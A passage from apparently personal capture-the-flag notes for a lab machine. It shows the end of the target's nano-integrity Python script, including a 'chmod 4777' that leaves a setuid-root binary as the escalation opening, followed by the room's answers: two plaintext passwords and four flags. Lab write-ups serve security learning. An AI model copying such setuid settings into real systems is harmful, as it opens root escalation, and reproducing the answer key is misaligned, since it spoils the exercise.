                    os.system("wall 'That is not nano, sending the cops, bye!'");
                    time.sleep(5)
                    os.system('shutdown now')
                else:
                    time.sleep(5)
                    os.system("sendEmail -t kral4@uranium.thm -f root@uranium.thm -s 127.0.0.1 -u \"Hi Kral4\" -m \"I think our index page has been hacked again. You know how to fix it, I am giving authorization.\" -vv -o tls=no")
                    time.sleep(10)
                    os.system("chown root:root /home/kral4/nano && chmod 4777 /home/kral4/nano")
                    break
            else:
                #no nano
                pass
        time.sleep(5)

check_integrity()


```

![[Pasted image 20230718201300.png]]

What is the required password for the chat app?

*MBMD1vdpjg3kGv6SsIz56VNG*

What is the password of hakanbey user?  

*Mys3cr3tp4sw0rD*

user_1.txt

*thm{2aa50e58fa82244213d5438187c0da7c}*

user_2.txt

*thm{804d12e6d16189075db2d45449aeda5f}*

web_flag.txt

*thm{019d332a6a223a98b955c160b3e6750a}*

root.txt

*thm{81498047439cc0426bafa1db5da699cd}*

[[Digital Forensics Case B4DM755]]